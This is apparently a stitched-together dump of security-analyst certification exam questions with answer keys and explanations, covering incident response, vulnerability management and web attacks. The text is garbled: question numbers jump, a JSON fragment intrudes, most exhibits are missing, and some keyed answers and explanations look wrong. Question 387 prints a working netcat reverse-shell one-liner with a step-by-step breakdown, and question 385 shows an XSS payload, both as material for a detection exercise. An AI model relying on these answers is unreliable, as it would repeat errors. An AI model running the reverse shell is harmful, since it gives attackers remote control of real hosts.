cryptographic algorithms, such as RC4, MD5, SHA-1, DES, \n3DES, and CBC mode.  \nIt supports only strong and modern cryptographic algorithms, such as AES-GCM, ChaCha20- \nPoly1305, and SHA-256/384.  \n\n\n \nIt reduces the number of round trips required for the handshake protocol, which improves \nperformance and latency.  \nIt encrypts more parts of the handshake protocol, which enhances privacy and confidentiality. It \nintroduces a zero round-trip time (0-RTT) mode, which allows resuming previous sessions \nwithout additional round trips.  \nIt supports forward secrecy by default, which means that compromising the long-term keys does \nnot affect the security of past sessions.  \nRemove cipher suites that use CBC. Cipher suites are combinations of cryptographic algorithms \nthat specify how TLS connections are secured. Cipher suites that use CBC mode are vulnerable \nto padding oracle attacks, as well as other attacks such as BEAST and Lucky 13. Therefore, they \nshould be removed from the server's configuration and replaced with cipher suites that use more \nsecure modes of operation, such as GCM or CCM.  \n  \n  \nQUESTION 376  \nAn analyst views the following log entries:  \n  \n  \n  \nThe organization has a partner vendor with hosts in the 216.122.5.x range. This partner vendor is \nrequired to have access to monthly reports and is the only external vendor with authorized \naccess. The organization prioritizes incident investigation according to the following hierarchy:  \n  \n- unauthorized data disclosure is more critical than denial of service \nattempts.  \n- which are more important than ensuring vendor data access.  \n  \nBased on the log files and the organization's priorities, which of the following hosts warrants \nadditional investigation?  \n  \nA. 121.19.30.221  \nB. 134.17.188.5  \nC. 202.180.1582  \nD. 216.122.5.5  \n  \nAnswer: A  \n  \n  \nQUESTION 377  \nAn analyst is conducting monitoring against an authorized team that win perform adversarial \ntechniques. The analyst interacts with the team twice per day to set the stage for the techniques \nto be used. Which of the following teams is the analyst a member of?  \n  \nA. Orange team  \nB. Blue team  \nC. Red team  \nD. Purple team  \n\n\n \n  \nAnswer: A Explanation:  \nAn orange team is a team that is involved in facilitation and training of other teams in \ncybersecurity. An orange team assists the yellow team, which is the management or leadership \nteam that oversees the cybersecurity strategy and governance of an organization. An orange \nteam helps the yellow team to understand the cybersecurity risks and challenges, as well as the \nroles and responsibilities of other teams, such as the red, blue, and purple teams. In this \nscenario, the analyst is conducting monitoring against an authorized team that will perform \nadversarial techniques. This means that the analyst is observing and evaluating the performance \nof another team that is simulating real-world attacks against the organization's systems or \nnetworks. This could be either a red team or a purple team, depending on whether they are \nworking independently or collaboratively with the defensive team. The analyst interacts with the \nteam twice per day to set the stage for the techniques to be used. This means that the analyst is \nproviding guidance and feedback to the team on how to conduct their testing and what \ntechniques to use. This could also involve setting up scenarios, objectives, rules of engagement, \nand success criteria for the testing. This implies that the analyst is facilitating and training the \nteam to improve their skills and capabilities in cybersecurity. Therefore, based on these \ndescriptions, the analyst is a member of an orange team, which is involved in facilitation and \ntraining of other teams in cybersecurity.  \n  \n  \nQUESTION 378  \nThe Chief Executive Officer (CEO) has notified that a confidential trade secret has been \ncompromised. Which of the following communication plans should the CEO initiate?  \n  \nA. Alert department managers to speak privately with affected staff.  \nB. Schedule a press release to inform other service provider customers of the compromise.  \nC. Disclose to all affected parties in the Chief Operating Officer for discussion and resolution. D. \nVerify legal notification requirements of PII and SPII in the legal and human resource \ndepartments.  \n  \nAnswer: A  \nExplanation:  \nThe CEO should initiate an alert to department managers to speak privately with affected staff.  \nThis is because the trade secret is confidential and should not be disclosed to the public. \nAdditionally, the CEO should verify legal notification requirements of PII and SPII in the legal and \nhuman resource departments to ensure compliance with data protection laws.  \n  \n  \nQUESTION 379  \nDuring an incident, analysts need to rapidly investigate by the investigation and leadership teams. \nWhich of the following best describes how PII should be safeguarded during an incident?  \n  \nA. Implement data encryption and close the data so only the company has access.  \nB. Ensure permissions are limited in the investigation team and encrypt the data.  \nC. Implement data encryption and create a standardized procedure for deleting data that is no \nlonger needed.  \nD. Ensure that permissions are open only to the company.  \n  \nAnswer: B Explanation:  \nThe best option to safeguard PII during an incident is to ensure permissions are limited in the \ninvestigation team and encrypt the data. This is because limiting permissions reduces the risk of \n\n\n \nunauthorized access or leakage of sensitive data, and encryption protects the data from being \nread or modified by anyone who does not have the decryption key.  \n  \n  \nQUESTION 380  \nA security analyst is reviewing the logs of a web server and notices that an attacker has \nattempted to exploit a SQL injection vulnerability. Which of the following tools can the analyst use \nto analyze the attack and prevent future attacks?  \n  \nA. A web application firewall  \nB. A network intrusion detection system  \nC. A vulnerability scanner  \nD. A web proxy  \n  \nAnswer: A Explanation:  \nA web application firewall (WAF) is a tool that can protect web servers from attacks such as SQL \ninjection, cross-site scripting, and other web-based threats. A WAF can filter, monitor, and block \nmalicious HTTP traffic before it reaches the web server. A WAF can also be configured with rules \nand policies to detect and prevent specific types of attacks.  \n  \n  \nQUESTION 381  \nWhich Of the following techniques would be best to provide the necessary assurance for \nembedded software that drives centrifugal pumps at a power Plant?  \n  \nA. Containerization  \nB. Manual code reviews  \nC. Static and dynamic analysis  \nD. Formal methods  \n  \nAnswer: D Explanation:  \nThe best technique to provide the necessary assurance for embedded software that drives \ncentrifugal pumps at a power plant is formal methods. Formal methods are a rigorous and \nmathematical approach to software development and verification, which can ensure the \ncorrectness and reliability of critical software systems. Formal methods can be used to specify, \ndesign, implement, and verify embedded software using formal languages, logics, and tools.  \n  \n  \nQUESTION 382  \nA security team identified several rogue Wi-Fi access points during the most recent network scan. \nThe network scans occur once per quarter. Which of the following controls would best all ow the \norganization to identity rogue devices more quickly?  \n  \nA. Implement a continuous monitoring policy.  \nB. Implement a BYOD policy.  \nC. Implement a portable wireless scanning policy.  \nD. Change the frequency of network scans to once per month.  \n  \nAnswer: A Explanation:  \nImplement a continuous monitoring policy. A continuous monitoring policy is a set of procedures \nand tools that enable an organization to detect and respond to unauthorized or anomalous \nactivities on its network in real time or near real time. A continuous monitoring policy can help \n\n\n \nidentify rogue access points as soon as they appear on the network, rather than waiting for \nquarterly or monthly scans. A continuous monitoring policy can also help improve the overall \nsecurity posture and compliance of the organization by providing timely and accurate information \nabout its network assets, vulnerabilities, threats, and incidents.  \n  \n  \nQUESTION 383  \nAn analyst needs to provide recommendations based on a recent vulnerability scan:  \n  \n  \n  \nWhich of the following should the analyst recommend addressing to ensure potential \nvulnerabilities are identified?  \n  \nA. SMB use domain SID to enumerate users  \nB. SYN scanner  \nC. SSL certificate cannot be trusted  \nD. Scan not performed with admin privileges  \n  \nAnswer: D Explanation:  \nThis is because scanning without admin privileges can limit the scope and accuracy of the \nvulnerability scan, and potentially miss some critical vulnerabilities that require higher privileges \nto detect. According to the OWASP Vulnerability Management Guide1, \"scanning without \nadministrative privileges will result in a large number of false negatives and an incomplete scan\". \nTherefore, the analyst should recommend addressing this issue to ensure potential vulnerabilities \nare identified.  \n  \n  \nQUESTION 384  \nA security analyst recently used Arachni to perform a vulnerability assessment of a newly \ndeveloped web application. The analyst is concerned about the following output:  \n  \n[+] XSS: In form input 'txtSearch' with action \nhttps://localhost/search.aspx   \n[-] XSS: Analyzing response #1...  \n[-] XSS: Analyzing response #2...  \n[-] XSS: Analyzing response #3...  \n[+] XSS: Response is tainted. Looking for proof of the vulnerability.  \n  \nWhich of the following is the most likely reason for this vulnerability?  \n  \nA. The developer set input validation protection on the specific field of search.aspx.  \nB. The developer did not set proper cross-site scripting protections in the header.  \n\n\n \nC. The developer did not implement default protections in the web application build.  \nD. The developer did not set proper cross-site request forgery protections.  \n  \nAnswer: B  \n  \n  \nQUESTION 385  \nA security analyst found the following vulnerability on the company's website:  \n  \n<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert(`test');\">  \n  \nWhich of the following should be implemented to prevent this type of attack in the future?  \n  \nA. Input sanitization  \nB. Output encoding  \nC. Code obfuscation  \nD. Prepared statements  \n  \nAnswer: A Explanation:  \nThis is a type of web application vulnerability called cross-site scripting (XSS), which allows an \nattacker to inject malicious code into a web page that is viewed by other users. XSS can be used \nto steal cookies, session tokens, credentials, or other sensitive information, or to perform actions \non behalf of the victim.  \nInput sanitization is a technique that prevents XSS attacks by checking and filtering the user input \nbefore processing it. Input sanitization can remove or encode any characters or strings that may \nbe interpreted as code by the browser, such as <, >, \", ', or javascript:. Input sanitization can also \nvalidate the input against a predefined format or range of values, and reject any input that does \nnot match. Output encoding is a technique that prevents XSS attacks by encoding the output \nbefore sending it to the browser. Output encoding can convert any characters or strings that may \nbe interpreted as code by the browser into harmless entities, such as <, >, \", ', or javascript:. \nOutput encoding can also escape any special characters that may have a different meaning in \ndifferent contexts, such as , /, or ;.  \nCode obfuscation is a technique that makes the source code of a web application more difficult to \nread and understand by humans. Code obfuscation can use techniques such as renaming \nvariables and functions, removing comments and whitespace, replacing literals with expressions, \nor adding dummy code. Code obfuscation can help protect the intellectual property and trade \nsecrets of a web application, but it does not prevent XSS attacks.  \n  \n  \nQUESTION 386  \nA disgruntled open-source developer has decided to sabotage a code repository with a logic \nbomb that will act as a wiper. Which of the following parts of the Cyber Kill Chain does this act \nexhibit?  \n  \nA. Reconnaissance  \nB. Weaponization  \nC. Exploitation  \nD. Installation  \n  \nAnswer: B Explanation:  \nWeaponization is the stage of the Cyber Kill Chain where the attacker creates or modifies a \nmalicious payload to use against a target. In this case, the disgruntled open-source developer \n\n\n \nhas created a logic bomb that will act as a wiper, which is a type of malware that destroys data on \na system. This is an example of weaponization, as the developer has prepared a cyberweapon to \nsabotage the code repository.  \n  \n  \nQUESTION 387  \nA security analyst detected the following suspicious activity:  \n  \nrm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 \n1234 > tmp/f   \n  \nWhich of the following most likely describes the activity?  \n  \nA. Network pivoting  \nB. Host scanning  \nC. Privilege escalation  \nD. Reverse shell  \n  \nAnswer: D Explanation:  \nThe provided command sequence is indicative of creating a reverse shell. Here's a breakdown of \nthe command: bash rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > \n/tmp/f rm -f /tmp/f: Removes the file /tmp/f if it exists. mknod / tmp/f p: Creates a named pipe \n/tmp/f. cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > / tmp/f: Pipes the input from the named \npipe to /bin/sh (starting an interactive shell), redirects the shell's input and output through netcat \n(nc), which then connects to the IP address 10.0.0.1 on port 1234, and sends the shell's output \nback through the named pipe.  \n  \n  \nQUESTION 388  \nAfter updating the email client to the latest patch, only about 15% of the workforce is able to use \nemail. Windows 10 users do not experience issues, but Windows 11 users have constant issues. \nWhich of the following did the change management team fail to do?  \n  \nA. Implementation  \nB. Testing  \nC. Rollback  \nD. Validation  \n  \nAnswer: B Explanation:  \nTesting is a crucial step in any change management process, as it ensures that the change is \ncompatible with the existing systems and does not cause any errors or disruptions. In this case, \nthe change management team failed to test the email client patch on Windows 11 devices, which \nresulted in a widespread issue for the users. Testing would have revealed the problem before the \npatch was deployed, and allowed the team to fix it or postpone the change.  \n  \n  \nQUESTION 389  \nA vulnerability scan of a web server that is exposed to the internet was recently completed.

It is used to correlate events to ascertain the TTPs of an attacker.  \nB. It is used to ascertain lateral movements of an attacker, enabling the process to be stopped. \nC. It provides a clear model of how an attacker generally operates during an intrusion and the \nactions to take at each stage  \nD. It outlines a clear path for determining the relationships between the attacker, the technology \nused, and the target  \n  \nAnswer: C Explanation:  \nThe Cyber Kill Chain methodology provides a clear model of how an attacker generally operates \nduring an intrusion and the actions to take at each stage. It is divided into seven stages: \nreconnaissance, weaponization, delivery, exploitation, installation, command and control, and \nactions on objectives. It helps network defenders understand and prevent cyberattacks by \nidentifying the attacker's objectives and tactics.  \n  \n  \nQUESTION 391  \nWhich of the following is a benefit of the Diamond Model of Intrusion Analysis?  \n  \nA. It provides analytical pivoting and identifies knowledge gaps.  \nB. It guarantees that the discovered vulnerability will not be exploited again in the future.  \nC. It provides concise evidence that can be used in court  \nD. It allows for proactive detection and analysis of attack events  \n  \nAnswer: A Explanation:  \nThe Diamond Model of Intrusion Analysis is a framework that helps analysts to understand the \nrelationships between the adversary, the victim, the infrastructure, and the capability involved in \nan attack. It also enables analytical pivoting, which is the process of moving from one piece of \ninformation to another related one, and identifies knowledge gaps that need further investigation.  \n  \n  \nQUESTION 392  \nWhich of the following is the most important reason for an incident response team to develop a \nformal incident declaration?  \n  \n\n\n \nA. To require that an incident be reported through the proper channels  \nB. To identify and document staff who have the authority to declare an incident  \nC. To allow for public disclosure of a security event impacting the organization  \nD. To establish the department that is responsible for responding to an incident  \n  \nAnswer: B Explanation:  \nThe formal incident declaration is crucial to identify and document the staff who have the \nauthority to declare an incident, ensuring that incidents are handled by authorized personnel.  \n  \n  \nQUESTION 393  \nA security manager is looking at a third-party vulnerability metric (SMITTEN) to improve upon the \ncompany's current method that relies on CVSSv3. Given the following:  \n  \n   \n  \nWhich of the following vulnerabilities should be prioritized?  \n  \nA. Vulnerability 1 \nB. Vulnerability 2 \nC. Vulnerability 3  \nD. Vulnerability 4  \n\n\n \n  \nAnswer: B Explanation:  \nVulnerability 2 should be prioritized as it is exploitable, has high exploit activity, and is exposed \nexternally according to the SMITTEN metric.  \n  \n  \nQUESTION 394  \nDue to an incident involving company devices, an incident responder needs to take a mobile  \nphone to the lab for further investigation. Which of the following tools should be used to maintain \nthe integrity of the mobile phone while it is transported? (Choose two.)  \n  \nA. Signal-shielded bag  \nB. Tamper-evident seal  \nC. Thumb drive  \nD. Crime scene tape  \nE. Write blocker  \nF. Drive duplicator  \n  \nAnswer: AB \nExplanation:  \nA signal-shielded bag and a tamper-evident seal are tools that can be used to maintain the \nintegrity of the mobile phone while it is transported. A signal-shielded bag prevents the phone \nfrom receiving or sending any signals that could compromise the data or evidence on the device. \nA tamper-evident seal ensures that the phone has not been opened or altered during the \ntransportation.  \n  \n  \nQUESTION 395  \nAn analyst is suddenly unable to enrich data from the firewall. However, the other open \nintelligence feeds continue to work. Which of the following is the most likely reason the firewall \nfeed stopped working?  \n  \nA. The firewall service account was locked out.  \nB. The firewall was using a paid feed.  \nC. The firewall certificate expired.  \nD. The firewall failed open.  \n  \nAnswer: C Explanation:  \nThe firewall certificate expired. If the firewall uses a certificate to authenticate and encrypt the \nfeed, and the certificate expires, the feed will stop working until the certificate is renewed or \nreplaced. This can affect the data enrichment process and the security analysis.  \n  \n  \nQUESTION 396  \nA security analyst noticed the following entry on a web server log:  \n  \nWarning: fopen (http://127.0.0.1:16) : failed to open stream:  \nConnection refused in /hj/var/www/showimage.php on line 7  \n  \nWhich of the following malicious activities was most likely attempted?  \n  \nA. XSS  \n\n\n \nB. CSRF  \nC. SSRF  \nD. RCE  \n  \nAnswer: C  \nExplanation:  \nThe malicious activity that was most likely attempted is SSRF (Server-Side Request Forgery). \nThis is a type of attack that exploits a vulnerable web application to make requests to other \nresources on behalf of the web server. In this case, the attacker tried to use the fopen function to \naccess the local loopback address (127.0.0.1) on port 16, which could be a service that is not \nintended to be exposed to the public. The connection was refused, indicating that the port was \nclosed or filtered.  \n  \n  \nQUESTION 397  \nA security analyst is reviewing events that occurred during a possible compromise. The analyst \nobtains the following log:  \n  \n   \n  \nWhich of the following is most likely occurring, based on the events in the log?  \n  \nA. An adversary is attempting to find the shortest path of compromise.  \nB. An adversary is performing a vulnerability scan.  \nC. An adversary is escalating privileges.  \nD. An adversary is performing a password stuffing attack.  \n  \nAnswer: B Explanation:  \nBased on the events in the log, the most likely occurrence is that an adversary is performing a \nvulnerability scan. The log shows LDAP read operations and EDR enumerating local groups, \nwhich are indicative of an adversary scanning the system to find vulnerabilities or sensitive \ninformation. The final entry shows SMB connection attempts to multiple hosts from a single host, \nwhich could be a sign of network discovery or lateral movement.  \n  \n  \nQUESTION 398  \nAXSS vulnerability was reported on one of the non-sensitive/non-mission-critical public websites \nof a company. The security department confirmed the finding and needs to provide a \nrecommendation to the application owner. Which of the following recommendations will best \nprevent this vulnerability from being exploited? (Choose two.)  \n  \n\n\n \nA. Implement an IPS in front of the web server.  \nB. Enable MFA on the website.  \nC. Take the website offline until it is patched.  \nD. Implement a compensating control in the source code.  \nE. Configure TLS v1.3 on the website.  \nF. Fix the vulnerability using a virtual patch at the WAF.  \n  \nAnswer: DF \nExplanation:  \nThe best recommendations to prevent an XSS vulnerability from being exploited are to implement  \na compensating control in the source code and to fix the vulnerability using a virtual patch at the \nWAF. A compensating control is a technique that mitigates the risk of a vulnerability by adding \nadditional security measures, such as input validation, output encoding, or HTML sanitization. A \nvirtual patch is a rule that blocks or modifies malicious requests or responses at the WAF level, \nwithout modifying the application code. These recommendations are effective, efficient, and less \ndisruptive than the other options.  \n  \n  \nQUESTION 399  \nAn organization has tracked several incidents that are listed in the following table:  \n  \n  \n  \nWhich of the following is the organization's MTTD?  \n  \nA. 140 \nB. 150 \nC. 160  \nD. 180  \n  \nAnswer: C Explanation:  \nThe MTTD (Mean Time To Detect) is calculated by averaging the time elapsed in detecting \nincidents. From the given data: (180+150+170+140)/4 = 160 minutes.  \n  \n  \nQUESTION 400  \nDuring an internal code review, software called \"ACE\" was discovered to have a vulnerability that \nallows the execution of arbitrary code. The vulnerability is in a legacy, third-party vendor resource \nthat is used by the ACE software. ACE is used worldwide and is essential for many businesses in \nthis industry. Developers informed the Chief Information Security Officer that removal of the \nvulnerability will take time. Which of the following is the first action to take?  \n  \nA. Look for potential loCs in the company.  \n\n\n \nB. Inform customers of the vulnerability.  \nC. Remove the affected vendor resource from the ACE software.  \nD. Develop a compensating control until the issue can be fixed permanently.  \n  \nAnswer: D Explanation:  \nA compensating control is an alternative measure that provides a similar level of protection as the \noriginal control, but is used when the original control is not feasible or cost-effective. In this case, \nthe CISO should develop a compensating control to mitigate the risk of the vulnerability in the \nACE software, such as implementing additional monitoring, firewall rules, or encryption, until the \nissue can be fixed permanently by the developers.  \n  \n  \nQUESTION 401  \nWhich of the following entities should an incident manager work with to ensure correct processes \nare adhered to when communicating incident reporting to the general public, as a best practice? \n(Choose two.)  \n  \nA. Law enforcement  \nB. Governance  \nC. Legal  \nD. Manager  \nE. Public relations  \nF. Human resources  \n  \nAnswer: CE \nExplanation:  \nAn incident manager should work with the legal and public relations entities to ensure correct \nprocesses are adhered to when communicating incident reporting to the general public, as a best \npractice. The legal entity can provide guidance on the legal implications and obligations of \ndisclosing the incident, such as compliance with data protection laws, contractual obligations, and \nliability issues. The public relations entity can help craft the appropriate message and tone for the \npublic communication, as well as manage the reputation and image of the organization in the \naftermath of the incident. These two entities can help the incident manager balance the need for \ntransparency and accountability with the need for confidentiality and security.  \n  \n  \nQUESTION 402  \nA security analyst reviews the following results of a Nikto scan:  \n  \n\n\n \n  \n  \nWhich of the following should the security administrator investigate next?  \n  \nA. tiki  \nB. phpList  \nC. shtml.exe  \nD. sshome  \n  \nAnswer: C Explanation:  \nThe security administrator should investigate shtml.exe next, as it is a potential vulnerability that \nallows remote code execution on the web server. Nikto scan results indicate that the web server \nis running Apache on Windows, and that the shtml.exe file is accessible in the /scripts/ directory. \nThis file is part of the Server Side Includes (SSI) feature, which allows dynamic content \ngeneration on web pages. However, if the SSI feature is not configured properly, it can allow \nattackers to execute arbitrary commands on the web server by injecting malicious code into the \nURL or the web page. Therefore, the security administrator should check the SSI configuration \nand permissions, and remove or disable the shtml.exe file if it is not needed.  \n  \n  \nQUESTION 403  \nEach time a vulnerability assessment team shares the regular report with other teams, \ninconsistencies regarding versions and patches in the existing infrastructure are discovered. \nWhich of the following is the best solution to decrease the inconsistencies?  \n  \nA. Implementing credentialed scanning  \nB. Changing from a passive to an active scanning approach  \nC. Implementing a central place to manage IT assets  \nD. Performing agentless scanning  \n  \nAnswer: C Explanation:  \nImplementing a central place to manage IT assets is the best solution to decrease the \ninconsistencies regarding versions and patches in the existing infrastructure. A central place to \nmanage IT assets, such as a configuration management database (CMDB), can help the \n\n\n \nvulnerability assessment team to have an accurate and up-to-date inventory of all the hardware \nand software components in the network, as well as their relationships and dependencies. A \nCMDB can also track the changes and updates made to the IT assets, and provide a single \nsource of truth for the vulnerability assessment team and other teams to compare and verify the \nversions and patches of the infrastructure. Implementing credentialed scanning, changing from a \npassive to an active scanning approach, and performing agentless scanning are all methods to \nimprove the vulnerability scanning process, but they do not address the root cause of the \ninconsistencies, which is the lack of a central place to manage IT assets.  \n  \n  \nQUESTION 404  \nA security analyst has found a moderate-risk item in an organization's point-of-sale application. \nThe organization is currently in a change freeze window and has decided that the risk is not high \nenough to correct at this time. Which of the following inhibitors to remediation does this scenario \nillustrate?  \n  \nA. Service-level agreement  \nB. Business process interruption  \nC. Degrading functionality  \nD. Proprietary system  \n  \nAnswer: B Explanation:  \nBusiness process interruption is the inhibitor to remediation that this scenario illustrates. Business \nprocess interruption is when the remediation of a vulnerability or an incident requires the disruption \nor suspension of a critical or essential business process, such as the point-of-sale application. This \ncan cause operational, financial, or reputational losses for the organization, and may outweigh the \nbenefits of the remediation. Therefore, the organization may decide to postpone or avoid the \nremediation until a more convenient time, such as a change freeze window, which is a period of \ntime when no changes are allowed to the IT environment. Servicelevel agreement, degrading \nfunctionality, and proprietary system are other possible inhibitors to remediation, but they are not \nrelevant to this scenario. Service-level agreement is when the remediation of a vulnerability or an \nincident violates or affects the contractual obligations or expectations of the service provider or the \ncustomer. Degrading functionality is when the remediation of a vulnerability or an incident reduces \nor impairs the performance or usability of a system or an application. Proprietary system is when \nthe remediation of a vulnerability or an incident involves a system or an application that is owned \nor controlled by a third party, and the organization has limited or no access or authority to modify it.  \n  \n  \nQUESTION 405  \nAn organization is conducting a pilot deployment of an e-commerce application. The application's \nsource code is not available. Which of the following strategies should an analyst recommend to \nevaluate the security of the software?  \n  \nA. Static testing  \nB. Vulnerability testing  \nC. Dynamic testing  \nD. Penetration testing  \n  \nAnswer: D Explanation:  \nPenetration testing is the best strategy to evaluate the security of the software without the source \ncode. Penetration testing is a type of security testing that simulates real-world attacks on the \nsoftware to identify and exploit its vulnerabilities. Penetration testing can be performed on the \n\n\n \nsoftware as a black box, meaning that the tester does not need to have access to the source \ncode or the internal structure of the software. Penetration testing can help the analyst to assess \nthe security posture of the software, the potential impact of the vulnerabilities, and the \neffectiveness of the existing security controls. Static testing, vulnerability testing, and dynamic \ntesting are other types of security testing, but they usually require access to the source code or \nthe internal structure of the software. Static testing is the analysis of the software code or design \nwithout executing it. Vulnerability testing is the identification and evaluation of the software \nweaknesses or flaws. Dynamic testing is the analysis of the software code or design while \nexecuting it.  \n  \n  \nQUESTION 406  \nAn attacker recently gained unauthorized access to a financial institution's database, which \ncontains confidential information. The attacker exfiltrated a large amount of data before being \ndetected and blocked. A security analyst needs to complete a root cause analysis to determine \nhow the attacker was able to gain access. Which of the following should the analyst perform first?  \n  \nA. Document the incident and any findings related to the attack for future reference.  \nB. Interview employees responsible for managing the affected systems.  \nC. Review the log files that record all events related to client applications and user access.  \nD. Identify the immediate actions that need to be taken to contain the incident and minimize \ndamage.  \n  \nAnswer: C  \nExplanation:  \nIn a root cause analysis following unauthorized access, the initial step is usually to review \nrelevant log files. These logs can provide critical information about how and when the attacker \ngained access.  \nThe first step in a root cause analysis after a data breach is typically to review the logs. This \nhelps the analyst understand how the attacker gained access by providing a detailed record of all \nevents, including unauthorized or abnormal activities.

Reformat and reimage the OS.  \n  \nAnswer: B Explanation:  \nThe symptoms suggest that the computer may be compromised, potentially with malware or \nunauthorized remote access. The first step in incident response is containment to prevent further \nspread or damage. Disconnecting the device from the network isolates it, preventing the attacker \nfrom continuing operations or accessing additional systems. Leaving the PC turned on preserves \nvolatile data (e.g., memory contents, active connections) that may be critical for forensic analysis.  \n  \n  \nQUESTION 558  \nA security analyst finds an application that cannot enforce the organization's password policy. An \nexception is granted. As a compensating control, all users must confirm that their passwords \ncomply with the organization's policy. Which of the following types of compensating controls is the \norganization using?  \n  \nA. Corrective  \nB. Managerial  \nC. Technical  \nD. Detective  \n  \nAnswer: B Explanation:  \nA managerial control involves policies, procedures, or administrative actions designed to \nmanage and enforce compliance with security requirements. In this case, requiring users to \nconfirm that their passwords comply with the organization's policy is an administrative measure \nimplemented to compensate for the application's inability to enforce the password policy. This \nfalls under the category of managerial controls.  \n\n\n \n  \n  \nQUESTION 559  \nA security analyst provides the management team with an after action report for a security \nincident. Which of the following is the management team most likely to review in order to correct \nvalidated issues with the incident response processes?  \n  \nA. Tabletop exercise  \nB. Lessons learned  \nC. Root cause analysis  \nD. Forensic analysis  \n  \nAnswer: B Explanation:  \nThe lessons learned phase is a formal step in the incident response process where teams review \nwhat went wrong, what worked, and how to improve future responses. Management uses this to \nadjust policies, procedures, and controls based on real incident experiences.  \n  \n  \nQUESTION 560  \nA security analyst needs to prioritize vulnerabilities for patching.

The behavioral patterns indicate that a TCP SYN flood attack has been initiated, \nfollowed by a port scan of the company's public IP range. No other attacks are being performed \nfrom the actor's source IP address. All of the SYN flood attempts were thwarted by the firewall's \nstateful packet inspection engine. Which of the following is the most likely type of threat actor in \nthis scenario?  \n  \nA. Nation-state  \nB. Script kiddie  \nC. Advanced persistent threat  \nD. Organized crime  \n  \nAnswer: B Explanation:  \nThe attacker’s behavior - launching a basic SYN flood followed by a simple port scan using \nreadily available tools - matches the hallmark of a low-skill actor experimenting with automated \nscripts rather than a stealthy, goal-driven campaign. A script kiddie typically tries generic DoS and \nscanning tools without further sophisticated tradecraft.  \n  \n  \nQUESTION 600  \nThe SOC team reestablishes user access after a threat actor successfully performed a business \naccount compromise in which the attacker revoked the legitimate user's access. The following \nlogs are provided to a SOC analyst:  \n  \n\n\n \n  \n  \nWhich of the following did the threat actor most likely use during the compromise?  \n  \nA. Brute-force password attack  \nB. A valid, leaked credential  \nC. Command-and-control traffic  \nD. Introduction of a new account  \n  \nAnswer: B Explanation:  \nThe attacker first authenticated successfully (single-factor) from a known device, then registered \na new MFA device, removed the legitimate MFA device, and changed the password - all actions \nrequiring valid credentials. This pattern indicates they’d obtained jdoe’s real password rather than \nguessing it or creating a backdoor account.  \n  \n  \nQUESTION 601  \nSIMULATION  \n  \nA healthcare organization must develop an action plan based on the findings from a risk \nassessment. The action plan must consist of risk categorization and prioritization.  \n  \nINSTRUCTIONS  \n  \nClick on the audit report and risk matrix to review their contents.  \n  \nAssign a categorization to each risk and determine the order in which the findings must be \nprioritized for remediation according to the risk rating score.  \n  \nIf at any time you would like to bring back the initial state of the simulation, please click the Reset \nAll button.  \n  \n\n\n \n   \n  \n  \n \n\n\n \n  \n  \nAnswer:   \n\n\n \n  \n\n\n \n  \nExplanation:  \nHere are the correct risk prioritizations and risk categorizations for each risk finding, based on the \naudit report, risk matrix, and calculated scores:",

      "explanation": "MITRE ATT&CK is expressly designed to catalog and map the tactics, techniques, and \nprocedures (i.e. the methods) that adversaries use across all phases of an attack. It provides a \ndetailed framework for identifying exactly how attackers operate, making it the go-to model for \nunderstanding adversary methods.  \n  \n  \nQUESTION 603  \nAn organization adds an MSSP to supplement its security monitoring operations during \nweekends and holidays. Which of the following would best demonstrate procurement value to the \nChief Information Security Officer?  \n  \nA. Stakeholder validation metrics  \n\n\n \nB. Mean time to respond  \nC. Alert volume  \nD. Number of escalations per week  \n  \nAnswer: B Explanation:  \nReduced response times directly reflect the MSSP’s value by showing how quickly incidents are \ndetected and acted upon during off-hours. This metric ties their services to tangible risk reduction \nand operational efficiency.  \n  \n  \nQUESTION 604  \nWhich of the following explains the reason a security analyst would map an attack route?  \n  \nA. To find critical paths that can be used to stop an adversary from advancing  \nB. To create an inventory of all IT assets to import into a database  \nC. To operationalize intelligence gathered from a previous step in the investigation D. To \ncategorize the tactics according to the MITRE ATT&CK framework  \n  \nAnswer: A Explanation:  \nMapping the attack route pinpoints the most likely lateral-movement and escalation paths, letting \ndefenders harden or monitor those choke points to disrupt the adversary’s progress.  \n  \n  \nQUESTION 605  \nThe most recent vulnerability scan results show the following:  \n  \n  \n  \nThe vulnerability team learned the following from the asset owners:  \n  \n- Server HQFIN01 is a financial transaction database server used in the company's largest \nbusiness unit.  \n- Server HQADMIN02 is utilized by an end user with administrator privileges to several critical \napplications.  \n- No compensating controls exist for either issue.  \n  \nWhich of the following would the vulnerability team most likely do to determine remediation \nprioritization?  \n  \nA. Review the BCP and prioritize the remediation of the asset that would take more time to bring \nonline for operational use.  \nB. Contact the network and desktop engineering teams to discuss prioritizing the asset that is faster \nto remediate.  \nC. Reference the BIA to determine the value designation and prioritize vulnerability remediation of \nthe more critical asset.  \n\n\n \nD. Identify the network placement and configuration of each asset, then prioritize the asset with the \nleast recent backups.  \n  \nAnswer: C Explanation:  \nBy consulting the Business Impact Analysis, the team can objectively assess which system - the \nfinancial-transaction database on HQFIN01 - carries the greatest operational and financial risk, \nthen focus remediation efforts there first.  \n  \n  \nQUESTION 606  \nA company’s policy is to follow NIST standards and use strong encryption to avoid disclosure of \nsensitive information in transit between any systems. An analyst reviews a lab web server and \nreceives the following outputs:  \n  \n  \n  \nWhich of the following should the analyst identify as the most concerning?  \n  \nA. TLS 1.0 is enabled.  \nB. The certificate is self-signed.  \nC. SSLv3 is disabled.  \nD. TLS 1.3 is not widely supported.  \nE. TLS compression is disabled.  \n  \nAnswer: A Explanation:  \nNIST SP 800-52 Rev. 2 deprecates TLS 1.0 (and 1.1) because of known weaknesses; allowing \nclients to fall back to these versions undermines the integrity of the encrypted channel. All other \nfindings either strengthen encryption (disabling SSLv3, compression) or don’t directly \ncompromise the cryptographic strength (self-signed cert, lack of TLS 1.3).  \n  \n  \n\n\n \nQUESTION 607  \nWhich of the following does a security policy do?  \n  \nA. Establishes a cost model for security activity  \nB. Identifies and clarifies security goals and objectives  \nC. Enables management to define system access rules  \nD. Allows management to define system recovery requirements  \n  \nAnswer: B Explanation:  \nA security policy provides the high-level direction from leadership by defining the organization’s \nsecurity goals and objectives. It does not dive into cost models, specific access controls, or \nrecovery procedures - that detail is reserved for standards, guidelines, and procedures.  \n  \n  \nQUESTION 608  \nA security analyst is assessing the security of a cloud environment. The following output is \ngenerated when the assessment runs:  \n  \nAuthentication error  